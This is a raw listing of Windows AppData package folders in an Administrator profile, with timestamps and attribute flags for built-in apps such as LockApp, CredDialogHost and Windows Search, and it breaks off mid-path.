Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/LocalState 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/RoamingState 2025-02-16 10:48:53 D.... Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/Settings 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/SystemAppData 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/TempState 2025-02-16 10:48:48 D.HS. Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/AC/INetCache 2025-02-16 10:48:48 D.HS. Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/AC/INetCookies 2025-02-16 10:48:48 D.HS. Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/AC/INetHistory 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/AC/Temp 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/AC 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/AppData 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/LocalCache 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/LocalState 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/RoamingState 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/Settings 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/SystemAppData 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/TempState 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/AC/INetCache 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/AC/INetCookies 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/AC/INetHistory 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/AC/Temp 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/AC 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/AppData 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/LocalCache 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/LocalState 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/RoamingState 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/Settings 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/SystemAppData 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/TempState 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/AC/INetCache 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/AC/INetCookies 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/AC/INetHistory 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/AC/Temp 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/AC 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/AppData 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/LocalCache 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/LocalState 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/RoamingState 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/Settings 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/SystemAppData 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/TempState 2025-02-16 10:48:48 D.HS. Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/AC/INetCache 2025-02-16 10:48:48 D.HS. Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/AC/INetCookies 2025-02-16 10:48:48 D.HS. Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/AC/INetHistory 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/AC/Temp 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/AC 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/AppData 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/LocalCache 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/LocalState 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/RoamingState 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/Settings 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/SystemAppData 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/TempState 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/AC/INetCache 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/AC/INetCookies 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/AC/INetHistory 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/AC/Temp 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/AC 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/AppData 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/LocalCache 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/LocalState 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/RoamingState 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/Settings 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/SystemAppData 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/TempState 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/AC/INetCache 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/AC/INetCookies 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/AC/INetHistory 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/AC/Temp 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/AC 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/AppData 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/LocalCache 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/LocalState 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/RoamingState 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/Settings 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/SystemAppData 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/TempState 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/AC/INetCache 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/AC/INetCookies 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/AC/INetHistory 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/AC/Temp 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.UI.Xaml.2.4_8wekyb3d8bbwe/AC 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.UI.Xaml.2.4_8wekyb3d8bbwe/AC/INetCache 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.UI.Xaml.2.4_8wekyb3d8bbwe/AC/INetCookies 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.UI.Xaml.2.4_8wekyb3d8bbwe/AC/INetHistory 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.UI.Xaml.2.4_8wekyb3d8bbwe/AC/Temp 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.VCLibs.140.00_8wekyb3d8bbwe/AC 2025-02-16 10:48:49 D.HS. Administrator/AppData/Local/Packages/Microsoft.VCLibs.140.00_8wekyb3d8bbwe/AC/INetCache 2025-02-16 10:48:49 D.HS. Administrator/AppData/Local/Packages/Microsoft.VCLibs.140.00_8wekyb3d8bbwe/AC/INetCookies 2025-02-16 10:48:49 D.HS. Administrator/AppData/Local/Packages/Microsoft.VCLibs.140.00_8wekyb3d8bbwe/AC/INetHistory 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.VCLibs.140.00_8wekyb3d8bbwe/AC/Temp 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/AC 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/AppData 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/LocalCache 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/LocalState 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/RoamingState 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/Settings 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/SystemAppData 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/TempState 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/AC/INetCache 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/AC/INetCookies 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/AC/INetHistory 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/AC/Temp 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/AC 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/AppData 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/LocalCache 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/LocalState 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/RoamingState 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/Settings 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/SystemAppData 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/TempState 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/AC/INetCache 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/AC/INetCookies 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/AC/INetHistory 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/AC/Temp 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/AC 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/AppData 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/LocalCache 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/LocalState 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/RoamingState 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/Settings 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/SystemAppData 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/TempState 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/AC/INetCache 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/AC/INetCookies 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/AC/INetHistory 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/AC/Temp 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/AC 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/AppData 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/LocalCache 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/LocalState 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/RoamingState 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/Settings 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/SystemAppData 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/TempState 2025-02-16 10:48:48 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/AC/INetCache 2025-02-16 10:48:48 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/AC/INetCookies 2025-02-16 10:48:48 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/AC/INetHistory 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/AC/Temp 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/AC 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/AppData 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/LocalCache 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/LocalState 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/RoamingState 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/Settings 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/SystemAppData 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/TempState 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/AC/INetCache 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/AC/INetCookies 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/AC/INetHistory 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/AC/Temp 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/AC 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/AppData 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/LocalCache 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/LocalState 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/RoamingState 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/Settings 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/SystemAppData 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/TempState 2025-02-16 10:48:48 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/AC/INetCache 2025-02-16 10:48:48 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/AC/INetCookies 2025-02-16 10:48:48 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/AC/INetHistory 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/AC/Temp 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/AC 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/AppData 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/LocalCache 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/LocalState 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/RoamingState 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/Settings 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/SystemAppData 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/TempState 2025-02-16 10:48:48 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/AC/INetCache 2025-02-16 10:48:48 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/AC/INetCookies 2025-02-16 10:48:48 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/AC/INetHistory 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/AC/Temp 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/AC 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/AppData 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/LocalCache 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/LocalState 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/RoamingState 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/Settings 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/SystemAppData 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/TempState 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/AC/INetCache 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/AC/INetCookies 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/AC/INetHistory 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/AC/Temp 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/AC 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/AppData 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/LocalCache 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/LocalState 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/RoamingState 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/Settings 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/SystemAppData 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/TempState 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/AC/INetCache 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/AC/INetCookies 2025-02-16 11:11:01 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/AC/INetHistory 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/AC/Temp 2025-02-16 10:52:22 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC 2025-02-16 10:52:22 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData 2025-02-16 10:48:50 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalCache 2025-02-16 10:52:23 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState 2025-02-16 10:48:50 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/RoamingState 2025-02-16 10:48:52 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/Settings 2025-02-16 10:48:50 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/SystemAppData 2025-02-16 11:12:53 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/TempState 2025-02-16 10:59:22 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/INetCache 2025-02-16 10:52:22 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/INetCookies 2025-02-16 10:48:50 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/INetHistory 2025-02-16 10:52:22 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Microsoft 2025-02-16 10:52:22 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Temp 2025-02-16 10:48:53 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/TokenBroker 2025-02-16 10:52:22 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/INetCookies/ESE 2025-02-16 10:52:22 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Microsoft/Internet Explorer 2025-02-16 10:52:22 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Microsoft/Internet Explorer/DOMStore 2025-02-16 10:52:22 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Microsoft/Internet Explorer/DOMStore/AKRB79I3 2025-02-16 10:52:22 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Microsoft/Internet Explorer/DOMStore/M9FQX7WM 2025-02-16 10:52:22 D.HS. Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Microsoft/Internet 